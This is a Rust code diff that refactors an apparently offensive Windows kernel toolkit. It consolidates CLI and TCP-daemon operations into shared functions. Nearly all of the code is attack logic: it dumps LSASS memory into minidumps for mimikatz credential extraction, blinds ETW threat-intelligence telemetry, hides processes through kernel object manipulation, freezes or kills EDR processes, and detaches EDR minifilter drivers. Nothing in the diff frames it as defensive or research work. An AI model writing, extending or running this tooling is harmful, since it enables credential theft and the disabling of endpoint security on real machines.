@@ -44,10 +44,7 @@
 
 #[cfg(target_os = "windows")]
 fn main() {
-    use nyx_operator_kernelsdk::{
-        win, CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit,
-        NeutralizeMethod, PatchGuardKit, PplKit, ProcHideKit,
-    };
+    use nyx_operator_kernelsdk::win;
 
     // ---- 1. Parse args ----
     let args: Vec<String> = std::env::args().collect();
@@ -186,131 +183,73 @@ fn main() {
             eprintln!("[+] bootstrap complete. tier.rw is live. Use a subcommand to drive a kit.");
         }
 
-        "blind-etw" => {
-            if let Some(etw) = &tier.etw_ti {
-                match etw.blind(&*tier.rw) {
-                    Ok(()) => eprintln!("[+] ETW-TI blinded OK"),
-                    Err(e) => {
-                        eprintln!("[!] ETW-TI blind failed: {e:?}");
-                        std::process::exit(5);
-                    }
-                }
-            } else {
-                eprintln!("[!] ETW-TI kit not available (etw_ti_handle_kva was 0)");
+        "blind-etw" => match op_blind_etw(&tier) {
+            Ok(()) => eprintln!("[+] ETW-TI blinded OK"),
+            Err(e) => {
+                eprintln!("[!] {e}");
                 std::process::exit(5);
             }
-        }
+        },
 
         "hide" => {
             let pid = parse_pid(&args, 2);
-            if let Some(hide) = &tier.hide {
-                match hide.hide(&*tier.rw, pid) {
-                    Ok(()) => eprintln!("[+] process {pid} hidden (DKOM)"),
-                    Err(e) => {
-                        eprintln!("[!] hide failed: {e:?}");
-                        std::process::exit(5);
-                    }
+            match op_hide(&tier, pid) {
+                Ok(()) => eprintln!("[+] process {pid} hidden (DKOM)"),
+                Err(e) => {
+                    eprintln!("[!] {e}");
+                    std::process::exit(5);
                 }
-            } else {
-                eprintln!("[!] hide kit not available");
-                std::process::exit(5);
             }
         }
 
         "dump-lsass" => {
             let pid = parse_pid(&args, 2);
-            if let Some(cred) = &tier.cred {
-                // Use dump_lsass_with_base so we get the captured VA — needed
-                // to wrap the raw bytes in a minidump envelope mimikatz parses.
-                match cred.dump_lsass_with_base(&*tier.rw, pid) {
-                    Ok((bytes, base_va)) => {
-                        let path = format!("lsass_{pid}.dmp");
-                        if base_va == 0 {
-                            // The cred kit didn't resolve the base (floor impl
-                            // or a probe failure). Write raw bytes + warn.
-                            eprintln!(
-                                "[!] base VA unresolved — writing RAW bytes (not a minidump). \
-                                 mimikatz will reject this; supply a kernel kit that resolves \
-                                 ImageBaseAddress."
-                            );
-                            match std::fs::write(&path, &bytes) {
-                                Ok(()) => eprintln!(
-                                    "[+] LSASS raw bytes: {path} ({} bytes)",
-                                    bytes.len()
-                                ),
-                                Err(e) => eprintln!("[!] write failed: {e}"),
-                            }
-                        } else {
-                            // Wrap the raw bytes in a minidump envelope.
-                            let dump = nyx_minidump_assembler::assemble_minidump(
-                                pid,
-                                base_va,
-                                &bytes,
-                                build,
-                            );
-                            match std::fs::write(&path, &dump) {
-                                Ok(()) => eprintln!(
-                                    "[+] LSASS minidump: {path} ({} bytes raw + envelope, \
-                                     base_va=0x{base_va:x}, build={build}). \
-                                     Parse with mimikatz `sekurlsa::logonpasswords`.",
-                                    dump.len()
-                                ),
-                                Err(e) => eprintln!("[!] write failed: {e}"),
-                            }
-                        }
-                    }
-                    Err(e) => {
-                        eprintln!("[!] dump_lsass failed: {e:?}");
-                        std::process::exit(5);
-                    }
+            match op_dump_lsass(&tier, build, pid) {
+                Ok(d) => eprintln!(
+                    "[+] LSASS minidump: {} ({} bytes raw + envelope, base_va=0x{:x}, build={build}). \
+                     Parse with mimikatz `sekurlsa::logonpasswords`.",
+                    d.path, d.dump_len, d.base_va
+                ),
+                Err(e) => {
+                    eprintln!("[!] {e}");
+                    std::process::exit(5);
                 }
-            } else {
-                eprintln!("[!] cred kit not available");
-                std::process::exit(5);
             }
         }
 
         "neutralize" => {
             let pid = parse_pid(&args, 2);
             let method = match args.get(3).map(|s| s.as_str()) {
-                Some("freeze") => NeutralizeMethod::Freeze,
-                Some("choke") => NeutralizeMethod::Choke,
-                Some("kill") => NeutralizeMethod::Kill,
+                Some("freeze") => nyx_operator_kernelsdk::NeutralizeMethod::Freeze,
+                Some("choke") => nyx_operator_kernelsdk::NeutralizeMethod::Choke,
+                Some("kill") => nyx_operator_kernelsdk::NeutralizeMethod::Kill,
                 _ => {
                     eprintln!("usage: neutralize <pid> <freeze|choke|kill>");
                     std::process::exit(1);
                 }
             };
-            if let Some(neu) = &tier.neutralize {
-                match neu.neutralize(pid, method) {
-                    Ok(()) => eprintln!("[+] EDR {pid} neutralized ({:?})", method),
-                    Err(e) => {
-                        eprintln!("[!] neutralize failed: {e:?}");
-                        std::process::exit(5);
-                    }
+            match op_neutralize(&tier, pid, method) {
+                Ok(NeutralizeOutcome::Done) => {
+                    eprintln!("[+] EDR {pid} neutralized ({method:?})");
                 }
-            } else {
-                eprintln!("[!] neutralize kit not available");
-                std::process::exit(5);
+                Ok(NeutralizeOutcome::KillKva(kva)) => eprintln!(
+                    "[+] EDR {pid} kill: EPROCESS KVA 0x{kva:x} — terminate via driver \
+                     IOCTL or PplStripper"
+                ),
+                Err(e) => {
+                    eprintln!("[!] {e}");
+                    std::process::exit(5);
+                }
             }
         }
 
-        "detach-minifilter" => {
-            if let Some(mf) = &tier.minifilter {
-                match mf.detach_edr(&*tier.rw) {
-                    Ok(()) => eprintln!("[+] EDR MiniFilters detached"),
-                    Err(e) => {
-                        eprintln!("[!] detach failed: {e:?}");
-                        std::process::exit(5);
-                    }
-                }
-            } else {
-                eprintln!(
-                    "[!] minifilter kit not available (flt_globals_kva was 0 — supply --flt-rva)"
-                );
+        "detach-minifilter" => match op_detach_minifilter(&tier) {
+            Ok(()) => eprintln!("[+] EDR MiniFilters detached"),
+            Err(e) => {
+                eprintln!("[!] {e}");
                 std::process::exit(5);
             }
-        }
+        },
 
         "pg-window" => {
             // Enter a PatchGuard unchecked window. select_pg_window picks the
@@ -542,6 +481,134 @@ fn detect_build() -> u32 {
     } else {
         0
     }
+}
+
+// ---- Shared kernel ops (kernel-tools-5) ----
+//
+// ONE implementation per kernel op, used by BOTH the CLI subcommand dispatch
+// (main() above) and the daemon dispatcher (dispatch_daemon_op below). Before
+// this consolidation the two arms drifted — dump-lsass was the worst: the CLI
+// wrote RAW bytes when base_va==0 (a false-success artifact mimikatz rejects)
+// while the daemon errored. Decisions made once here:
+//   * `base_va == 0` after `dump_lsass_with_base` is an ERROR. A dump without
+//     the source VA cannot be wrapped in a minidump envelope; the raw-bytes
+//     fallback is REMOVED.
+//   * `neutralize(Kill)` resolves the target EPROCESS KVA via `kill_kva` (the
+//     actionable artifact for a driver IOCTL / PplStripper flow); Freeze/Choke
+//     run the user-mode `neutralize()` tier.
+
+/// Result of a successful [`op_dump_lsass`] — the written minidump artifact.
+#[cfg(target_os = "windows")]
+struct LsassDump {
+    path: String,
+    dump_len: usize,
+    base_va: u64,
+}
+
+/// Shared `dump-lsass` kernel op (CLI + daemon): kernel-capture LSASS bytes
+/// for `pid`, wrap them in a minidump envelope (needs the source VA), write
+/// `lsass_{pid}.dmp`. `base_va == 0` → Err (raw bytes are NOT a usable dump).
+#[cfg(target_os = "windows")]
+fn op_dump_lsass(
+    tier: &nyx_operator_kernelsdk::KernelTier,
+    build: u32,
+    pid: u32,
+) -> Result<LsassDump, String> {
+    use nyx_operator_kernelsdk::CredKit;
+    let cred = tier
+        .cred
+        .as_ref()
+        .ok_or_else(|| "cred kit not available".to_string())?;
+    let (bytes, base_va) = cred
+        .dump_lsass_with_base(&*tier.rw, pid)
+        .map_err(|e| format!("dump_lsass failed: {e:?}"))?;
+    if base_va == 0 {
+        return Err(format!(
+            "base VA unresolved for pid {pid} — raw bytes are not a minidump and mimikatz would \
+             reject them; refusing to write a false-success artifact"
+        ));
+    }
+    let dump = nyx_minidump_assembler::assemble_minidump(pid, base_va, &bytes, build);
+    let path = format!("lsass_{pid}.dmp");
+    std::fs::write(&path, &dump).map_err(|e| format!("write {path} failed: {e}"))?;
+    Ok(LsassDump {
+        path,
+        dump_len: dump.len(),
+        base_va,
+    })
+}
+
+/// Shared `blind-etw` kernel op (CLI + daemon).
+#[cfg(target_os = "windows")]
+fn op_blind_etw(tier: &nyx_operator_kernelsdk::KernelTier) -> Result<(), String> {
+    use nyx_operator_kernelsdk::EtwTiKit;
+    let etw = tier
+        .etw_ti
+        .as_ref()
+        .ok_or_else(|| "ETW-TI kit not available (etw_ti_handle_kva was 0)".to_string())?;
+    etw.blind(&*tier.rw)
+        .map_err(|e| format!("ETW-TI blind failed: {e:?}"))
+}
+
+/// Shared `hide` kernel op (CLI + daemon).
+#[cfg(target_os = "windows")]
+fn op_hide(tier: &nyx_operator_kernelsdk::KernelTier, pid: u32) -> Result<(), String> {
+    use nyx_operator_kernelsdk::ProcHideKit;
+    let hide = tier
+        .hide
+        .as_ref()
+        .ok_or_else(|| "hide kit not available".to_string())?;
+    hide.hide(&*tier.rw, pid)
+        .map_err(|e| format!("hide failed: {e:?}"))
+}
+
+/// Outcome of a shared `neutralize` op: `Done` for the user-mode Freeze/Choke
+/// tiers, `KillKva` for the Kill tier (the resolved EPROCESS KVA — the
+/// actionable artifact for a driver IOCTL / PplStripper flow).
+#[cfg(target_os = "windows")]
+enum NeutralizeOutcome {
+    Done,
+    KillKva(usize),
+}
+
+/// Shared `neutralize` kernel op (CLI + daemon). Kill resolves the target
+/// EPROCESS KVA via `kill_kva`; Freeze/Choke run the user-mode tier. The CLI
+/// arm previously passed Kill to `neutralize()` (which always errors without a
+/// KernelRw param) — unified on the daemon's kill_kva behavior.
+#[cfg(target_os = "windows")]
+fn op_neutralize(
+    tier: &nyx_operator_kernelsdk::KernelTier,
+    pid: u32,
+    method: nyx_operator_kernelsdk::NeutralizeMethod,
+) -> Result<NeutralizeOutcome, String> {
+    use nyx_operator_kernelsdk::EdrNeutralizeKit;
+    let neu = tier
+        .neutralize
+        .as_ref()
+        .ok_or_else(|| "neutralize kit not available".to_string())?;
+    match method {
+        nyx_operator_kernelsdk::NeutralizeMethod::Kill => {
+            let kva = neu
+                .kill_kva(&*tier.rw, pid)
+                .map_err(|e| format!("kill failed: {e:?}"))?;
+            Ok(NeutralizeOutcome::KillKva(kva))
+        }
+        freeze_or_choke => neu
+            .neutralize(pid, freeze_or_choke)
+            .map(|()| NeutralizeOutcome::Done)
+            .map_err(|e| format!("neutralize failed: {e:?}")),
+    }
+}
+
+/// Shared `detach-minifilter` kernel op (CLI + daemon).
+#[cfg(target_os = "windows")]
+fn op_detach_minifilter(tier: &nyx_operator_kernelsdk::KernelTier) -> Result<(), String> {
+    use nyx_operator_kernelsdk::MiniFilterKit;
+    let mf = tier.minifilter.as_ref().ok_or_else(|| {
+        "minifilter kit not available (flt_globals_kva was 0 — supply --flt-rva)".to_string()
+    })?;
+    mf.detach_edr(&*tier.rw)
+        .map_err(|e| format!("detach failed: {e:?}"))
 }
 
 // ---- §P3.b Daemon mode: persistent kernel session over TCP ----
@@ -797,11 +864,6 @@ fn read_line_capped<R: std::io::BufRead>(reader: &mut R, out: &mut Vec<u8>) -> s
 /// `hide`, `neutralize`) reject pid <= 0 or absent.
 #[cfg(target_os = "windows")]
 fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, build: u32) -> String {
-    use nyx_operator_kernelsdk::{
-        CallbackKit, CredKit, EdrNeutralizeKit, EtwTiKit, KernelRw, MiniFilterKit, NeutralizeMethod,
-        ProcHideKit,
-    };
-
     let op = json_string_field(line, "op").unwrap_or_default();
     // Keep the raw Option so we can distinguish `"pid":0` / absent from a
     // well-formed positive pid.
@@ -812,93 +874,48 @@ fn dispatch_daemon_op(line: &str, tier: &nyx_operator_kernelsdk::KernelTier, bui
             let Some(pid) = pid_opt.filter(|p| *p > 0) else {
                 return json_err("dump-lsass requires pid > 0");
             };
-            if let Some(cred) = &tier.cred {
-                match cred.dump_lsass_with_base(&*tier.rw, pid) {
-                    Ok((bytes, base_va)) => {
-                        if base_va == 0 {
-                            return json_err("base VA unresolved — raw bytes only");
-                        }
-                        let dump = nyx_minidump_assembler::assemble_minidump(
-                            pid, base_va, &bytes, build,
-                        );
-                        let path = format!("lsass_{pid}.dmp");
-                        if std::fs::write(&path, &dump).is_err() {
-                            return json_err("write failed");
-                        }
-                        format!(
-                            r#"{{"ok":true,"out_file":"{path}","bytes":{},"base_va":"0x{:x}"}}"#,
-                            dump.len(), base_va
-                        )
-                    }
-                    Err(e) => json_err(&format!("dump_lsass: {e:?}")),
-                }
-            } else {
-                json_err("cred kit not assembled")
+            match op_dump_lsass(tier, build, pid) {
+                Ok(d) => format!(
+                    r#"{{"ok":true,"out_file":"{}","bytes":{},"base_va":"0x{:x}"}}"#,
+                    d.path, d.dump_len, d.base_va
+                ),
+                Err(e) => json_err(&e),
             }
         }
-        "blind-etw" => {
-            if let Some(etw) = &tier.etw_ti {
-                match etw.blind(&*tier.rw) {
-                    Ok(()) => json_ok(),
-                    Err(e) => json_err(&format!("blind-etw: {e:?}")),
-                }
-            } else {
-                json_err("etw_ti kit not assembled")
-            }
-        }
+        "blind-etw" => match op_blind_etw(tier) {
+            Ok(()) => json_ok(),
+            Err(e) => json_err(&e),
+        },
         "hide" => {
             let Some(pid) = pid_opt.filter(|p| *p > 0) else {
                 return json_err("hide requires pid > 0");
             };
-            if let Some(hide) = &tier.hide {
-                match hide.hide(&*tier.rw, pid) {
-                    Ok(()) => json_ok(),
-                    Err(e) => json_err(&format!("hide: {e:?}")),
-                }
-            } else {
-                json_err("hide kit not assembled")
+            match op_hide(tier, pid) {
+                Ok(()) => json_ok(),
+                Err(e) => json_err(&e),
             }
         }
-        "detach-minifilter" => {
-            if let Some(mf) = &tier.minifilter {
-                match mf.detach_edr(&*tier.rw) {
-                    Ok(()) => json_ok(),
-                    Err(e) => json_err(&format!("detach-minifilter: {e:?}")),
-                }
-            } else {
-                json_err("minifilter kit not assembled (supply --flt-rva)")
-            }
-        }
+        "detach-minifilter" => match op_detach_minifilter(tier) {
+            Ok(()) => json_ok(),
+            Err(e) => json_err(&e),
+        },
         "neutralize" => {
             let Some(pid) = pid_opt.filter(|p| *p > 0) else {
                 return json_err("neutralize requires pid > 0");
             };
             let method = json_string_field(line, "method").unwrap_or_default();
             let m = match method.as_str() {
-                "freeze" => NeutralizeMethod::Freeze,
-                "choke" => NeutralizeMethod::Choke,
-                "kill" => NeutralizeMethod::Kill,
+                "freeze" => nyx_operator_kernelsdk::NeutralizeMethod::Freeze,
+                "choke" => nyx_operator_kernelsdk::NeutralizeMethod::Choke,
+                "kill" => nyx_operator_kernelsdk::NeutralizeMethod::Kill,
                 _ => return json_err("neutralize requires method freeze|choke|kill"),
             };
-            if let Some(neu) = &tier.neutralize {
-                match m {
-                    // neutralize(Kill) on the trait ALWAYS errors (no KernelRw
-                    // param). Use the dedicated kill() to resolve the target
-                    // EPROCESS KVA — the actionable artifact for the driver's
-                    // terminate IOCTL / PplStripper flow.
-                    NeutralizeMethod::Kill => match neu.kill_kva(&*tier.rw, pid) {
-                        Ok(kva) => format!(
-                            r#"{{"ok":true,"action":"kill","eprocess_kva":"0x{kva:x}","note":"terminate via driver IOCTL or PplStripper"}}"#
-                        ),
-                        Err(e) => json_err(&format!("kill: {e:?}")),
-                    },
-                    freeze_or_choke => match neu.neutralize(pid, freeze_or_choke) {
-                        Ok(()) => json_ok(),
-                        Err(e) => json_err(&format!("neutralize: {e:?}")),
-                    },
-                }
-            } else {
-                json_err("neutralize kit not assembled")
+            match op_neutralize(tier, pid, m) {
+                Ok(NeutralizeOutcome::Done) => json_ok(),
+                Ok(NeutralizeOutcome::KillKva(kva)) => format!(
+                    r#"{{"ok":true,"action":"kill","eprocess_kva":"0x{kva:x}","note":"terminate via driver IOCTL or PplStripper"}}"#
+                ),
+                Err(e) => json_err(&e),
             }
         }
         "status" => {
